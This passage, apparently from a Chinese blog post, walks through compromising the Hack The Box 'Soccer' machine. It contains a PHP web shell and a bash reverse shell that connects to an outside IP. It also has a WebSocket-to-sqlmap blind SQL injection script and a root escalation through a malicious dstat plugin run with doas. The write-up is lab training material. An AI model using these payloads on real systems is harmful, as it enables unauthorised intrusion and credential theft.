+|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
+|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
+|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
+80/tcp   open  http            nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://soccer.htb/
+9091/tcp open  xmltec-xmlmail?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   GetRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src &#39;none&#39;
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 139
+|     Date: Sun, 12 Feb 2023 03:04:57 GMT
+|     Connection: close
+</code></pre>
+<p>开放了22  80 9091端口，将soccer.htb添加进入&#x2F;etc&#x2F;hosts,访问web</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.21ldy5kvp49s.webp" alt="image"></p>
+<p>由wappalyzer得到服务器版本为Nginx1.18.0</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>工具很多，字典选好就行,</p>
+<pre><code class="shell">┌──(root💀kali)-[~/dirsearch]
+└─# wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u &#39;http://soccer.htb/FUZZ&#39; -t 200                 
+
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL siton.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://soccer.htb/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                              
+=====================================================================
+
+000000001:   200        147 L    526 W      6917 Ch     &quot;# directory-list-2.3-medium.txt&quot;                                                                    
+000000007:   200        147 L    526 W      6917 Ch     &quot;# license, visit http://creativecommons.org/licenses/by-sa/3.0/&quot;                                    
+000000003:   200        147 L    526 W      6917 Ch     &quot;# Copyright 2007 James Fisher&quot;                                                                      
+000000014:   200        147 L    526 W      6917 Ch     &quot;http://soccer.htb/&quot;                                                                                 
+000000013:   200        147 L    526 W      6917 Ch     &quot;#&quot;                                                                                                  
+000000010:   200        147 L    526 W      6917 Ch     &quot;#&quot;                                                                                                  
+000000012:   200        147 L    526 W      6917 Ch     &quot;# on atleast 2 different hosts&quot;                                                                     
+000000009:   200        147 L    526 W      6917 Ch     &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;                                                
+000000011:   200        147 L    526 W      6917 Ch     &quot;# Priority ordered case sensative list, where entries were found&quot;                                   
+000000006:   200        147 L    526 W      6917 Ch     &quot;# Attribution-Share Alike 3.0 License. To view a copy of this&quot;                                      
+000000008:   200        147 L    526 W      6917 Ch     &quot;# or send a letter to Creative Commons, 171 Second Street,&quot;                                         
+000000005:   200        147 L    526 W      6917 Ch     &quot;# This work is licensed under the Creative Commons&quot;                                                 
+000000002:   200        147 L    526 W      6917 Ch     &quot;#&quot;                                                                                                  
+000000004:   200        147 L    526 W      6917 Ch     &quot;#&quot;                                                                                                  
+000008034:   301        7 L      12 W       178 Ch      &quot;tiny&quot; 
+</code></pre>
+<p>扫出&#x2F;tiny，访问</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.43mpjmv3hys0.webp" alt="image"></p>
+<p>是一个文件管理系统，tiny file manager，Google一下</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/prasathmani/tinyfilemanager" >https://github.com/prasathmani/tinyfilemanager<i class="fas fa-external-link-alt"></i></a></p>
+<p>在GitHub主页得到此系统的默认管理员密码admin&#x2F;admin@123 和 user&#x2F;12345</p>
+<p>登录进去</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.5wuz70cybt80.webp" alt="image"></p>
+<p>可以上传文件，右下角有提示版本为2.4.3，Google一下</p>
+<p>存在rce漏洞，<a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/50828" >https://www.exploit-db.com/exploits/50828<i class="fas fa-external-link-alt"></i></a></p>
+<p>可以通过别人写好的exp利用漏洞，这里我通过手工的方式利用</p>
+<h3 id="rce漏洞利用"><a href="#rce漏洞利用" class="headerlink" title="rce漏洞利用"></a>rce漏洞利用</h3><p>写一个shell.php上传</p>
+<pre><code class="shell">┌──(root💀kali)-[~/桌面]
+└─# cat shell.php     
+&lt;?php
+        system($_REQUEST[&#39;cmd&#39;])
+?&gt; 
+</code></pre>
+<p>上传时，注意，我们只在&#x2F;tiny&#x2F;uploads目录下有写入权限</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.5447wcuahtc0.webp" alt="image"></p>
+<p>命令执行成功</p>
+<p>接下来就可以上传一个反弹shell的文件</p>
+<pre><code class="shell">┌──(root💀kali)-[~/桌面]
+└─# cat n3ym4r.php                                                                                           
+&lt;?php
+system(&quot;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.16.8/6666&lt;&amp;1&#39;&quot;)
+?&gt;
+</code></pre>
+<p>nc监听</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# nc -lvvp 6666            
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::6666
+Ncat: Listening on 0.0.0.0:6666
+xzc
+ls
+Ncat: Connection from 10.10.11.194.
+Ncat: Connection from 10.10.11.194:47232.
+bash: cannot set terminal process group (1044): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@soccer:~/html/tiny/uploads$ ls
+n3ym4r.php
+</code></pre>
+<h3 id="子域名发现"><a href="#子域名发现" class="headerlink" title="子域名发现"></a>子域名发现</h3><p>反弹成功，到处查看文件</p>
+<pre><code>www-data@soccer:/etc$ cd ..
+cd ..
+www-data@soccer:/$ cat /etc/hosts
+cat /etc/hosts
+127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb
+
+127.0.1.1       ubuntu-focal    ubuntu-focal
+</code></pre>
+<p>在&#x2F;etc&#x2F;hosts文件发现，还绑定了一个子域名，将他加入本地&#x2F;etc&#x2F;hosts，访问</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.1p1c7mqr8q00.webp" alt="image"></p>
+<pre><code class="js">&lt;script&gt;
+        var ws = new WebSocket(&quot;ws://soc-player.soccer.htb:9091&quot;);
+        window.onload = function () &#123;
+        
+        var btn = document.getElementById(&#39;btn&#39;);
+        var input = document.getElementById(&#39;id&#39;);
+        
+        ws.onopen = function (e) &#123;
+            console.log(&#39;connected to the server&#39;)
+        &#125;
+        input.addEventListener(&#39;keypress&#39;, (e) =&gt; &#123;
+            keyOne(e)
+        &#125;);
+        
+        function keyOne(e) &#123;
+            e.stopPropagation();
+            if (e.keyCode === 13) &#123;
+                e.preventDefault();
+                sendText();
+            &#125;
+        &#125;
+        
+        function sendText() &#123;
+            var msg = input.value;
+            if (msg.length &gt; 0) &#123;
+                ws.send(JSON.stringify(&#123;
+                    &quot;id&quot;: msg
+                &#125;))
+            &#125;
+            else append(&quot;????????&quot;)
+        &#125;
+        &#125;
+        
+        ws.onmessage = function (e) &#123;
+        append(e.data)
+        &#125;
+        
+        function append(msg) &#123;
+        let p = document.querySelector(&quot;p&quot;);
+        // let randomColor = &#39;#&#39; + Math.floor(Math.random() * 16777215).toString(16);
+        // p.style.color = randomColor;
+        p.textContent = msg
+        &#125;
+    &lt;/script&gt;
+</code></pre>
+<p>该代码在 URL “ws:&#x2F;&#x2F;soc-player.soccer.htb:9091” 处建立到服务器的新 WebSocket 连接。加载页面时，它会设置一个事件侦听器，用于当用户在 ID 为“id”的输入元素中按下“Enter”键时。当按下“Enter”键时，调用函数“sendText”。 “sendText”函数用于通过 WebSocket 连接向服务器发送消息。该消息由一个 JSON 对象组成，该对象具有单个属性“id”和一个等于输入元素值的值。该代码还有一个名为“append”的函数，当 WebSocket 连接从服务器接收到消息时调用该函数.该函数将消息作为参数并将“p”元素的文本内容设置为消息。</p>
+<p>输入参数可能容易受到 sqli 注入攻击,google一下</p>
+<h3 id="websocket-sql注入漏洞利用"><a href="#websocket-sql注入漏洞利用" class="headerlink" title="websocket sql注入漏洞利用"></a>websocket sql注入漏洞利用</h3><p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.6p8ji0dnvj80.webp" alt="image"></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html" >https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>链接内容讲的很清楚，这里不再赘述，将脚本的内容做些必要的更改,将ws_server和data参数进行修改</p>
+<pre><code class="python">from http.server import SimpleHTTPRequestHandler
+from socketserver import TCPServer
+from urllib.parse import unquote, urlparse
+from websocket import create_connection
+
+ws_server = &quot;ws://soc-player.soccer.htb:9091&quot;
+
+def send_ws(payload):
+    ws = create_connection(ws_server)
+    # If the server returns a response on connect, use below line	
+    #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
+    
+    # For our case, format the payload in JSON
+    message = unquote(payload).replace(&#39;&quot;&#39;,&#39;\&#39;&#39;) # replacing &quot; with &#39; to avoid breaking JSON structure
+    data = &#39;&#123;&quot;id&quot;:&quot;%s&quot;&#125;&#39; % message
+
+    ws.send(data)
+    resp = ws.recv()
+    ws.close()
+
+    if resp:
+        return resp
+    else:
+        return &#39;&#39;
+
+def middleware_server(host_port,content_type=&quot;text/plain&quot;):
+
+    class CustomHandler(SimpleHTTPRequestHandler):
+        def do_GET(self) -&gt; None:
+            self.send_response(200)
+            try:
+                payload = urlparse(self.path).query.split(&#39;=&#39;,1)[1]
+            except IndexError:
+                payload = False
+                
+            if payload:
+                content = send_ws(payload)
+            else:
+                content = &#39;No parameters specified!&#39;
+
+            self.send_header(&quot;Content-type&quot;, content_type)
+            self.end_headers()
+            self.wfile.write(content.encode())
+            return
+
+    class _TCPServer(TCPServer):
+        allow_reuse_address = True
+
+    httpd = _TCPServer(host_port, CustomHandler)
+    httpd.serve_forever()
+
+
+print(&quot;[+] Starting MiddleWare Server&quot;)
+print(&quot;[+] Send payloads in http://localhost:8081/?id=*&quot;)
+
+try:
+    middleware_server((&#39;0.0.0.0&#39;,8081))
+except KeyboardInterrupt:
+    pass
+</code></pre>
+<p>开个终端执行此脚本，另开一终端对托管到8081的的中间服务器执行sqlmap</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# sqlmap -u &quot;http://localhost:8081/?id=1&quot; -p &quot;id&quot; --dbs
+        ___
+       __H__
+ ___ ___[&quot;]_____ ___ ___  &#123;1.7#stable&#125;
+|_ -| . [&quot;]     | .&#39;| . |
+|___|_  [&quot;]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+</code></pre>
+<p>由于是sql盲注，所以等待时间稍微有点长</p>
+<pre><code class="shell">available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] soccer_db
+[*] sys
+
+[01:22:45] [INFO] fetched data logged to text files under &#39;/root/.local/share/sqlmap/output/localhost&#39;
+
+[*] ending @ 01:22:45 /2023-02-12/
+</code></pre>
+<p>得到player:PlayerOftheMatch2022</p>
+<h3 id="ssh连接-2"><a href="#ssh连接-2" class="headerlink" title="ssh连接"></a>ssh连接</h3><pre><code class="shell">┌──(root💀kali)-[~]
+└─# ssh player@10.10.11.194
+The authenticity of host &#39;10.10.11.194 (10.10.11.194)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:Ke/TB8v0VkzfMGP9JasA7Vb22F4d1X6hyU/U5+8JKws.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.11.194&#39; (ECDSA) to the list of known hosts.
+player@10.10.11.194&#39;s password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Feb 12 06:10:09 UTC 2023
+
+  System load:           0.08
+  Usage of /:            70.6% of 3.84GB
+  Memory usage:          26%
+  Swap usage:            0%
+  Processes:             241
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.194
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:2be6
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Feb 11 14:34:29 2023 from 10.10.14.154
+player@soccer:~$ ls
+linpeas.sh  snap  user.txt
+player@soccer:~$ cat user.txt
+8cf79e0f16b3ea6d7a7f433dd606b117
+</code></pre>
+<p>得到user flag</p>
+<h3 id="提权-3"><a href="#提权-3" class="headerlink" title="提权"></a>提权</h3><p>执行<code>sudo -l</code></p>
+<pre><code class="shell">player@soccer:~$ sudo -l
+[sudo] password for player: 
+Sorry, user player may not run sudo on localhost.
+</code></pre>
+<p>没有利用点</p>
+<p>尝试suid提权，执行<code>find / -perm -4000 2&gt;/dev/null -ls</code></p>
+<pre><code class="shell">player@soccer:~$ find / -perm -4000 2&gt;/dev/null -ls
+    70968     44 -rwsr-xr-x   1 root     root        42224 Nov 17 09:09 /usr/local/bin/doas
+    18263    140 -rwsr-xr-x   1 root     root       142792 Nov 28 04:55 /usr/lib/snapd/snap-confine
+     7696     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25 13:09 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    14300    464 -rwsr-xr-x   1 root     root         473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
+    16207     24 -rwsr-xr-x   1 root     root          22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+     7700     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+     1753     40 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /usr/bin/umount
+     2093     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
+     1752     56 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /usr/bin/mount
+     1647     68 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /usr/bin/su
+    13720     44 -rwsr-xr-x   1 root     root          44784 Nov 29 11:53 /usr/bin/newgrp
+     3023     84 -rwsr-xr-x   1 root     root          85064 Nov 29 11:53 /usr/bin/chfn
+     1724    164 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /usr/bin/sudo
+     3027     68 -rwsr-xr-x   1 root     root          68208 Nov 29 11:53 /usr/bin/passwd
+     3026     88 -rwsr-xr-x   1 root     root          88464 Nov 29 11:53 /usr/bin/gpasswd
+     3024     52 -rwsr-xr-x   1 root     root          53040 Nov 29 11:53 /usr/bin/chsh
+     2242     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at
+      135    121 -rwsr-xr-x   1 root     root         123560 Nov 25 17:29 /snap/snapd/17883/usr/lib/snapd/snap-confine
+      814     84 -rwsr-xr-x   1 root     root          85064 Mar 14  2022 /snap/core20/1695/usr/bin/chfn
+      820     52 -rwsr-xr-x   1 root     root          53040 Mar 14  2022 /snap/core20/1695/usr/bin/chsh
+      889     87 -rwsr-xr-x   1 root     root          88464 Mar 14  2022 /snap/core20/1695/usr/bin/gpasswd
+      973     55 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /snap/core20/1695/usr/bin/mount
+      982     44 -rwsr-xr-x   1 root     root          44784 Mar 14  2022 /snap/core20/1695/usr/bin/newgrp
+      997     67 -rwsr-xr-x   1 root     root          68208 Mar 14  2022 /snap/core20/1695/usr/bin/passwd
+     1107     67 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /snap/core20/1695/usr/bin/su
+     1108    163 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /snap/core20/1695/usr/bin/sudo
+     1166     39 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /snap/core20/1695/usr/bin/umount
+     1255     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25 13:09 /snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     1627    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1695/usr/lib/openssh/ssh-keysign
+</code></pre>
+<p>具有 suid 权限的不寻常文件是 <code>/usr/local/bin/doas</code></p>
+<p>Google一下doas</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://underc0de.org/foro/gnulinux/doas-una-alternativa-a-sudo-simple-ligera-y-segura/#:~:text=doas%20es%20un%20programa%20para,espec%C3%ADficos%20para%20ejecutar%20comandos%20espec%C3%ADficos" >https://underc0de.org/foro/gnulinux/doas-una-alternativa-a-sudo-simple-ligera-y-segura/#:~:text=doas%20es%20un%20programa%20para,espec%C3%ADficos%20para%20ejecutar%20comandos%20espec%C3%ADficos<i class="fas fa-external-link-alt"></i></a></p>
+<p>简单讲，doas 是一个以另一个用户身份运行命令的程序（类似于 sudo，但更简单），它的默认位置在“&#x2F;etc&#x2F;doas.conf”中</p>
+<pre><code class="shell">player@soccer:~$ find / -name doas.conf 2&gt;/dev/null
+/usr/local/etc/doas.conf
+player@soccer:~$ cat /usr/local/etc/doas.conf
+permit nopass player as root cmd /usr/bin/dstat
+</code></pre>
+<p>允许用户“player”使用 root 进行 dstat</p>
+<p>查看dstat官方文档</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/dstat-real/dstat" >https://github.com/dstat-real/dstat<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://linux.die.net/man/1/dstat" >https://linux.die.net/man/1/dstat<i class="fas fa-external-link-alt"></i></a></p>
+<p> Dstat 允许运行自定义插件，我们可以创建一个插件并使用 dstat 运行它，名称必须为dstat_*.py，插件存放的目录为<code>/usr/local/share/dstat/</code></p>
+<p>移动到此目录下，创建一个插件，写入代码</p>
+<pre><code class="shell">import os
+os.system(&quot;sh&quot;)
+</code></pre>
+<p>执行此插件</p>
+<pre><code class="shell">player@soccer:~$ cd /usr/local/share/dstat/
+player@soccer:/usr/local/share/dstat$ vim dstat_ahh.py
+player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --ahh
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#39;s documentation for alternative uses
+  import imp
+# ls
+dstat_ahh.py
+# whoami
+root
+# cat /root/root.txt
+fd1854e763db6cbf6e47036de2ad7bbf
+# 
+</code></pre>
+<p>得到root flag</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>easy一共是五个靶机，之前已经打过一个了，这里就是剩下四个的全部流程。</p>
+<p>总体的大概流程为端口发现—&gt;80端口子域名枚举、目录扫描—&gt;web漏洞利用—&gt;拿到网站管理员权限—&gt;查找各种信息—&gt;拿到主机本地用户权限—&gt;提权到root</p>
+<p>中间还会穿插各种漏洞利用，总体思路就是网页权限—&gt;本地权限—&gt;root权限</p>
+<p>遇事不决就上Google，通过网页端获得的各种信息，如网站框架版本，服务器版本，google一下就能出来漏洞利用点以及各种exp，拿来就能用</p>
+<p>信息泄露方面，各种框架的默认密码、配置文件里的信息。配置文件的地址上官网就能找到</p>
+<p>提权方面，这里只用到了<code>sudo滥用</code>  <code>suid</code>两种Linux下的提权方式，可以上传一些检测脚本，自动收集能利用的提权点</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li>本文标题：HTB-easy Machines系列</li>
+        <li>本文作者：n3ym4r</li>
+        <li>创建时间：2023-02-12 15:49:14</li>
+        <li>
+            本文链接：https://n3ym4r.github.io/2023/02/12/HTB-easy Machines系列/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%89%93%E9%9D%B6/">#打靶</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/HTB/">#HTB</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/02/10/Vaccine%E9%9D%B6%E6%9C%BA/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Vaccine靶机</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">n3ym4r</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题
+            &nbsp;
+            <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.9</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-up-right-and-down-left-from-center"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Stocker"><span class="nav-text">Stocker</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="nav-text">子域名枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NOsql%E6%B3%A8%E5%85%A5"><span class="nav-text">NOsql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">本地文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Precious"><span class="nav-text">Precious</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F-1"><span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-text">web漏洞发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-text">命令注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">反弹shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E8%BF%9E%E6%8E%A5"><span class="nav-text">ssh连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-1"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sudo-l"><span class="nav-text">sudo -l</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-YAML-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">通过 YAML 反序列化的远程代码执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MetaTwo"><span class="nav-text">MetaTwo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F-2"><span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-1"><span class="nav-text">web漏洞发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">SQL注入漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#john%E7%88%86%E7%A0%B4"><span class="nav-text">john爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E-CVE-2021-29447"><span class="nav-text">XXE漏洞-CVE-2021-29447</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ftp%E8%BF%9E%E6%8E%A5"><span class="nav-text">ftp连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E8%BF%9E%E6%8E%A5-1"><span class="nav-text">ssh连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-2"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#john%E7%88%86%E7%A0%B4-1"><span class="nav-text">john爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%AF%86%E7%A0%81"><span class="nav-text">查看密码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Soccer"><span class="nav-text">Soccer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F-3"><span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rce%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">rce漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8F%91%E7%8E%B0"><span class="nav-text">子域名发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#websocket-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">websocket sql注入漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E8%BF%9E%E6%8E%A5-2"><span class="nav-text">ssh连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-3"><span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
